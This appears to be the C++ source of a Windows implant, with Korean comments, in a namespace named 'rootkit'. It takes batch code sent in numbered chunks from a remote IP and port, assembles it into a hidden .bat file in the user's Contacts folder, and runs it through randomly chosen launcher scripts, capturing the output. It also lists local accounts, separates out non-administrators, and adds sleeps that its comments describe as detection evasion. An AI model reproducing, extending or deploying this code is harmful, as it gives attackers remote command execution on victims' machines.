#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define NODRAWTEXT      // DrawText()와 DT_* 매크로 제외
#define NOGDI           // GDI 기능을 제외 (폰트, 비트맵 등 안 쓸 때)
#define NOKANJI         // 한자 지원 제외
#ifndef UNLEN
#define UNLEN 256
#endif
#include <atlbase.h>
#include <atlconv.h>
#include <windows.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")

#include <iostream>
#include <fstream>
#include <cstdio>  
#include <string>
#include <memory>
#include <array>
#include <vector>
#include <variant>
#include <unordered_map>
#include <filesystem>
#include <algorithm>
#include <random>


#include "rootkit.hpp"
#include "picosha2.h"

namespace fs = std::filesystem;

// 큐 구조체
struct Queue {
	bool listening = false;
	int lastOrderNum = 0;
	// composite key start
	std::string ip; 
	unsigned short port = 0; 
	// composite key end
	bool directoryCreated = false;
};

// 코드 구조체
struct Code {
	int line;
	std::string code;
};

bool is_numeric(const std::string& s) {
	try {
		int _dummy = std::stoi(s);
		return true;
	}
	catch (const std::exception&) {
		return false;
	}
}

Queue* find_queue_by_ip(std::vector<Queue>& list, const std::string& ip) {
	auto it = std::find_if(list.begin(), list.end(), [&](const Queue& q) {
		return q.ip == ip;
		});

	if (it != list.end()) {
		return &(*it);
	}
	return nullptr;
}

std::wstring convert_to_wide(const std::string& str) {
	if (str.empty()) return std::wstring();
	int sizeNeeded = MultiByteToWideChar(CP_ACP, 0, &str[0], static_cast<int>(str.size()), nullptr, 0);
	std::wstring wstrTo(sizeNeeded, 0);
	MultiByteToWideChar(CP_ACP, 0, &str[0], static_cast<int>(str.size()), &wstrTo[0], sizeNeeded);
	return wstrTo;
}
std::string wchar_convert_to_string(const WCHAR* wcharStr) {
	int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wcharStr, -1, nullptr, 0, nullptr, nullptr);
	std::string strTo(sizeNeeded - 1, 0);
	WideCharToMultiByte(CP_UTF8, 0, wcharStr, -1, &strTo[0], sizeNeeded, nullptr, nullptr);
	return strTo;
}

namespace rootkit {
	// Forward Declaration
	std::vector<std::string> get_username_list();
	std::vector<std::string> get_username_list_not_admin();
	std::string get_program_host_username();
	std::string run_batch_with_output(const std::string& batchFilePath);

	std::vector<Queue> queueLists;
	std::unordered_map<std::string, std::vector<Code>> codes;

	std::string run_cmd_with_output(const std::string& cmd) {
		std::array<char, 128> buffer;
		std::string result;

		std::string redirect_cmd = cmd + " 2>&1";

		FILE* pipe = _popen(redirect_cmd.c_str(), "r");

		if (!pipe) {
			return "Error: Failed to open pipe";
		}

		try {
			while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
				result += buffer.data();
			}
		}
		catch (...) {
			_pclose(pipe);
			throw;
		}

		_pclose(pipe);
		return result;
	}

	std::string to_cmd_script(const std::string& cmd) {
		std::string postfix = "";
		bool isFirstSpaceCounted = false;
		for (int i = 0; i < cmd.length(); i++) {
			if (cmd[i] == ' ' && !isFirstSpaceCounted) {
				isFirstSpaceCounted = true;
				continue;
			}

			if (isFirstSpaceCounted) postfix += cmd[i];
		}
		return postfix;
	}

	FormatResult exploit_bat_formatter(std::string& ip, unsigned short port, const std::string& str) {
		// 앞 4자리는 순서 번호
		// 바로 다음 한자리 숫자는 종료 플래그(0 = 계속 전송중, 1 = 종료 플래그)
		// 뒤는 데이터

		// ip랑 포트번호를 어떻게 구함?
		// 내가 직접 넘겨줘야하나...

		std::string headerAll = str.substr(0, 5);
		if (!is_numeric(headerAll)) {
			return { "", FormatStatus::Failed };
		}
		std::string headerOrderNumber = headerAll.substr(0, 4);
		std::string headerFlag = headerAll.substr(4);
		int headerOrderNumber_i = std::stoi(headerOrderNumber);
		int headerFlag_i = std::stoi(headerFlag);
		if (headerFlag_i != 1 && headerFlag_i != 0) {
			return { "", FormatStatus::Failed };
		}
		// 코드(데이터) 파싱
		std::string code = str.substr(5);

		std::string username = get_program_host_username();
		if (username.empty()) {
			throw std::runtime_error("username 가져오기 실패");
		}
		std::string dir = "C:/Users/" + username + "/Contacts/port";

		// 이미 Queue에 등록되어 있는 경우
		if (codes.count(ip)) {
			bool headerFlag_b = headerFlag_i;
			// 송신 종료 플래그 == true
			if (headerFlag_b == true) {
				// 작성 필요
				// 마지막 코드 추가
				codes[ip].emplace_back(headerOrderNumber_i, code);
				// 먼저 정렬부터
				std::sort(codes[ip].begin(), codes[ip].end(), [&](const Code& a, const Code& b) {
					return a.line < b.line;
					});

				const std::string fileName = dir + "/" + picosha2::hash256_hex_string(ip) + ".bat";
				// 그 다음 파일로 만들기
				std::ofstream batchFile(fileName);

				if (batchFile.is_open()) {
					for (const Code& c : codes[ip]) {
						std::string code = c.code;
						batchFile << code << "\n";
					}
					batchFile.close();
					codes[ip].clear();
					return { "[LAST CODE SUCCESSFULY SAVED]", FormatStatus::Success };
				}
				return { "", FormatStatus::Failed };

			}
			// 송신 종료 플래그 == false
			else {
				// early return if - headerOrderNumber_i - 1 = lastOrderNum인가? (손실 없이 순서대로 왔는지)
				Queue* queue = find_queue_by_ip(queueLists, ip);
				if (queue->lastOrderNum != headerOrderNumber_i - 1) return { "", FormatStatus::Lost };
				codes[ip].emplace_back(headerOrderNumber_i, code);
				return { code, FormatStatus::Success };
			}
		}
		// 처음 연결, 혹은 Queue에 등록되어 있지 않은 경우
		else {
			bool headerFlag_b = (headerFlag_i == 1) ? true : false;
			if (headerFlag_b == true) {
				// 처음 메세지가 전송 끝이면 거절 장난하자는거야 뭐야;;
				// 한줄만 쓸꺼면 exploit을 쓰세요 제발;;
				return { "", FormatStatus::Failed };
			}
			if (headerOrderNumber_i != 1) {
				return { "", FormatStatus::Failed };
			}
			Queue queue;
			queue.listening = true;
			queue.lastOrderNum = headerOrderNumber_i;
			queue.ip = ip;
			queue.port = port;
			queueLists.emplace_back(queue);
			codes.try_emplace(ip);
			codes[ip].emplace_back(headerOrderNumber_i, code);
			// 설마 여기까지 왔는데 true겠어
			// 하지만 믿으면 안되지 검증은 필수
			if (queue.directoryCreated == false) {
				try {
					fs::create_directories(dir);
					queue.directoryCreated = true;
				}
				catch (const fs::filesystem_error& e) {
					std::cerr << "에러 메세지: " << e.what() << std::endl;
					std::cerr << "관련 경로 1: " << e.path1() << std::endl;
				}
			}
			return { code, FormatStatus::Success };
		}
	}

	std::vector<std::string> get_username_list() {
		LPUSER_INFO_1 pBuf = NULL;
		DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;

		NET_API_STATUS nStatus = NetUserEnum(NULL, 1, FILTER_NORMAL_ACCOUNT, reinterpret_cast<LPBYTE*>(&pBuf), MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries, &resumeHandle);

		std::vector<std::string> user_list;

		if (nStatus == NERR_Success || nStatus == ERROR_MORE_DATA) {
			for (DWORD i = 0; i < entriesRead; i++) {

				if (pBuf[i].usri1_flags & UF_ACCOUNTDISABLE) continue;

				int size_needed = WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, NULL, 0, NULL, NULL);
				std::string strTo(size_needed - 1, 0);
				WideCharToMultiByte(CP_ACP, 0, pBuf[i].usri1_name, -1, &strTo[0], size_needed, NULL, NULL);
				user_list.push_back(strTo);
			}
		}

		if (pBuf != NULL) {
			NetApiBufferFree(pBuf);
		}

		return user_list;
	}

	std::vector<std::string> get_username_list_not_admin() {
		std::vector<std::string> adminList = rootkit::get_username_list();
		for (auto user : adminList) {
			std::cout << user << std::endl;
		}
		std::vector<std::string> nonAdminList;
		for (auto username_s : adminList) {
			std::wstring username_ws = convert_to_wide(username_s);
			LPCWSTR username = username_ws.c_str();
			LPLOCALGROUP_USERS_INFO_0 pGroupBuf = nullptr;
			DWORD entriesRead = 0, totalEntries = 0;

			NET_API_STATUS nStatus = NetUserGetLocalGroups(nullptr, username, 0, LG_INCLUDE_INDIRECT, reinterpret_cast<LPBYTE*>(&pGroupBuf), MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries);

			bool isAdmin = false;
			if (nStatus == NERR_Success) {
				for (DWORD i = 0; i < entriesRead; i++) {
					if (wcscmp(pGroupBuf[i].lgrui0_name, L"Administrators") == 0) {
						isAdmin = true;
						break;
					}
				}
			}
			if (isAdmin) {
				if (pGroupBuf != nullptr) NetApiBufferFree(pGroupBuf);
				continue;
			}
			nonAdminList.push_back(username_s);
			if (pGroupBuf != nullptr) NetApiBufferFree(pGroupBuf);
		}
		return nonAdminList;
	}

	std::string get_program_host_username() {
		TCHAR name[UNLEN + 1];
		DWORD size = UNLEN + 1;

		if (GetUserName(name, &size)) {
			return wchar_convert_to_string(name);
		}
		else {
			return "";
		}
	}

	bool is_directory_exists(std::string& path) {
		CA2W path_w(path.c_str());
		
		DWORD dwAttrib = GetFileAttributesW(path_w);
		return (dwAttrib != INVALID_FILE_ATTRIBUTES && dwAttrib & FILE_ATTRIBUTE_DIRECTORY);
	}

	PathStatus make_run_bat(std::string& ip, unsigned short port) {
		std::string dir = "C:/Users/" + rootkit::get_program_host_username() + "/Contacts/port";
		if (!rootkit::is_directory_exists(dir)) {
			return PathStatus::Error;
		}
		
		const std::string fileName1 = dir + "/run1.bat";
		const std::string fileName2 = dir + "/run2.bat";
		const std::string fileName3 = dir + "/runMaster.bat";

		const std::string rtkFileName = picosha2::hash256_hex_string(ip) + ".bat";
		std::ofstream run1Bat(fileName1);

		if (run1Bat.is_open()) {
			run1Bat << "@echo off" << '\n';
			run1Bat << "call ./" + rtkFileName << '\n';
		}
		else return PathStatus::Error;
		
		std::ofstream run2Bat(fileName2);
		
		if (run2Bat.is_open()) {
			run2Bat << "@echo off" << '\n';
			run2Bat << "call ./" + rtkFileName << '\n';
		}
		else return PathStatus::Error;

		std::ofstream runMasterBat(fileName3);

		std::random_device rd;
		std::mt19937 gen(rd());

		std::uniform_int_distribution<int> dis(1, 2);

		Sleep(1000); // 탐지 우회용 Sleep
		int whatFileShouldIChoose = dis(gen);
		Sleep(1000); // 탐지 우회용 Sleep. 안걸리면 장땡이고 걸리면 아쉬운거지

		if (runMasterBat.is_open()) {
			runMasterBat << "@echo off" << '\n';
			runMasterBat << "call ./run" << whatFileShouldIChoose << ".bat" << '\n';
			return PathStatus::Success;
		}
		else return PathStatus::Error;
	}
	
	bool is_file_exists(std::string& path) {
		CA2W path_w(path.c_str());
		DWORD dwAttrib = GetFileAttributesW(path_w);

		return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
	}

	BatchFileResult start_run_bat() {
		std::string dir = "C:Users/" + rootkit::get_program_host_username() + "Contacts/port";
		std::string masterFileDir = dir + "/runMaster.bat";
		bool masterFileExists = is_file_exists(masterFileDir);

		if (masterFileExists) {
			std::string result = rootkit::run_batch_with_output(masterFileDir);
			BatchFileResult batchFileResult;
			batchFileResult.isSuccessToRun = true;
			batchFileResult.result = result;
			return batchFileResult;
		}
		else {
			BatchFileResult batchFileResult;
			batchFileResult.isSuccessToRun = false;
			batchFileResult.result = "";
			return batchFileResult;
		}
	}

	std::string run_batch_with_output(const std::string& batchFilePath) {
		std::string final_cmd = "chcp 65001 > nul && \"" + batchFilePath + "\" 2>&1";

		std::array<char, 128> buffer;
		std::string result;

		FILE* pipe = _popen(final_cmd.c_str(), "r");
		if (!pipe) return "Error: Failed to open pipe";

		try {
			while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
				result += buffer.data();
			}
		}
		catch (...) {
			_pclose(pipe);
			throw;
		}

		_pclose(pipe);
		return result;
	}
}